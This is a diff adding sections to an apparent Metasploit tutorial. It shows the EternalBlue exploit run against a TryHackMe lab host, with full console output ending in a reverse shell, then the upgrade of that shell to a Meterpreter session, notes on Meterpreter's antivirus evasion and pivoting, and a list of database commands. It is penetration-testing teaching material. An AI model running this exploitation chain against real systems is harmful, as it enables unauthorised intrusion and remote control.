@@ -401,25 +401,145 @@ For the sake of example and because it's easy, we'll demonstrate using MSF to ex
 
 Metasploitable2 has an [exploitability guide](https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide) that lists all the exposed ports and vulnerabilities.  Metasploitable3 has a [similar GitHub Wiki](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities) with everything you need to test out exploits and vulnerabilities.
 
-For this example, I'm going to use TryHackMe's [Blue Room](https://tryhackme.com/room/blue), since the EternalBlue (ms17_010_eternalblue) exploit is pretty reliable.  I'll just target that host (in my case, the IP is 10.10.206.89), and then check options to make sure everything is configured correctly, then `run` the exploit:
+For this example, I'm going to use TryHackMe's [Blue Room](https://tryhackme.com/room/blue), since the EternalBlue (ms17_010_eternalblue) exploit is pretty reliable.  I'll just target that host (in my case, the IP is 10.10.214.103), and then check options to make sure everything is configured correctly, then `run` the exploit:
 
 ```bash
---- INCOMPLETE ---
+msf5  exploit(windows/smb/ms17_010_eternalblue) > options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.10.214.103    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+   
+msf5 > run
+[*] Started reverse TCP handler on 10.2.8.137:4444
+[*] 10.10.214.103:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.214.103:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.214.103:445     - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.214.103:445 - Connecting to target for exploitation.
+...
+[+] 10.10.214.103:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.214.103:445 - Sending egg to corrupted connection.
+[*] 10.10.214.103:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (10.2.8.137:4444 -> 10.10.214.103:49187) at 2020-06-01 08:29:25 -0500
+[+] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+C:\Windows\system32>
 ```
+
+Keep in mind, this process may take a few tries.  Let it run all the way through, and don't worry if you see lines like:
+
+```bash
+[-] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.214.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+```
+
+With the EternalBlue exploit in particular, it plays with the target's buffer until it is able to execute the exploit effectively.
+
+## Meterpreter!
 
 Now, having a shell is awesome, and we can use this to do all sorts of things, but we're limited to the level of access of the process we're attached to, and it's difficult to create persistence.  For these reasons, MSF has Meterpreter!  
 
---- INCOMPLETE ---
+```
+Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.
+```
 
+That's a lot of heavy-duty verbiage, so let's break it down.
 
+`dynamically extensible payload` - This means that you can build an add extensions to Meterpreter, even after you've started running it on a target.  If you start working on a target, then realize you need to use an extension, you can simply `load` it and your host will send the extension to Meterpreter, adding the functionality on the fly!
 
+`uses in-memory DLL injection stagers` - Meterpreter does not sit on the hard drive, so it's invisible to standard anti-virus and file system scans.
 
+`comprehensive client-side Ruby API` - Just like Metasploit, it's built with Ruby, so much of the functionality from Metasploit translates to commands through Meterpreter.  This means you can use your Meterpreter shell to scan, enumerate, and exploit other devices that you normally wouldn't be able to target directly, such as devices behind a firewall!
 
+`command history, tab completion, channels, and more` - Tons of additional functionality exists with Meterpreter.
 
+We'll get into all the different functions and features of Meterpreter another day, but here's how to get to Meterpreter once you have a command shell access on a box:
 
+Ctrl-Z or `background` to background your shell and go back to Metasploit.
 
+Once in Metasploit, you can rely on Metasploit's built-in session upgrade function to upgrade a shell to a meterpreter session.  This works on most target OSes.
 
+```bash
+msf5 > sessions
+ -h
+Usage: sessions [options] or sessions [id]
 
+Active session manipulation and interaction.
+
+OPTIONS:
+
+    -C <opt>  Run a Meterpreter Command on the session given with -i, or all
+    -K        Terminate all sessions
+    -S <opt>  Row search filter.
+    -c <opt>  Run a command on the session given with -i, or all
+    -d        List all inactive sessions
+    -h        Help banner
+    -i <opt>  Interact with the supplied session ID
+    -k <opt>  Terminate sessions by session ID and/or range
+    -l        List all active sessions
+    -n <opt>  Name or rename a session by ID
+    -q        Quiet mode
+    -s <opt>  Run a script or module on the session given with -i, or all
+    -t <opt>  Set a response timeout (default: 15)
+    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
+    -v        List all active sessions in verbose mode
+    -x        Show extended information in the session table
+
+Many options allow specifying session ranges using commas and dashes.
+For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6
+```
+
+Run `sessions` to check the session number for your target shell.  If you haven't exploited any other targets since opening Metasploit, this should be session 1
+
+```bash
+msf5 > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type               Information
+                                  Connection
+  --  ----  ----               -----------
+                                  ----------
+  1         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.2.8.137:4444 -> 10.10.214.103:49187 (10.10.214.103)
+```
+
+Now, upgrade the session:
+
+```bash
+msf5 > sessions -u 1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.2.8.137:4433
+[*] Sending stage (176195 bytes) to 10.10.214.103
+[*] Meterpreter session 2 opened (10.2.8.137:4433 -> 10.10.214.103:49213) at 2020-06-01 08:51:47 -0500
+[*] Stopping exploit/multi/handler
+[*] Starting interaction with 2...
+
+meterpreter > 
+```
+
+With a Meterpreter shell, you can now do all sorts of things on the target, provided the process Meterpreter is attached to has high enough permissions.  We'll get into all the different functionality available with Meterpreter in another document, but you can check out [Offensive Security's in-depth chapter on Meterpreter here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).
 
 
 
@@ -474,10 +594,35 @@ current  name     hosts  services  vulns  creds  loots  notes
 
 
 
+For a list of commands that pull data from the database or add data to the database, type `? database`. 
 
+```bash
+msf5 > ? database
 
+Database Backend Commands
+=========================
 
+    Command           Description
+    -------           -----------
+    analyze           Analyze database information about a specific address or address range
+    db_connect        Connect to an existing data service
+    db_disconnect     Disconnect from the current data service
+    db_export         Export a file containing the contents of the database
+    db_import         Import a scan result file (filetype will be auto-detected)
+    db_nmap           Executes nmap and records the output automatically
+    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
+    db_remove         Remove the saved data service entry
+    db_save           Save the current data service connection as the default to reconnect on startup
+    db_status         Show the current data service status
+    hosts             List all hosts in the database
+    loot              List all loot in the database
+    notes             List all notes in the database
+    services          List all services in the database
+    vulns             List all vulnerabilities in the database
+    workspace         Switch between database workspaces
+```
 
+We'll go in-depth on how to use Metasploit's database functionality in a later chapter, but it's a great idea to learn this early on so you can store data from nmap scans, and reference them during later metasploit sessions, instead of having to manually note your findings as you go.
 
 
 
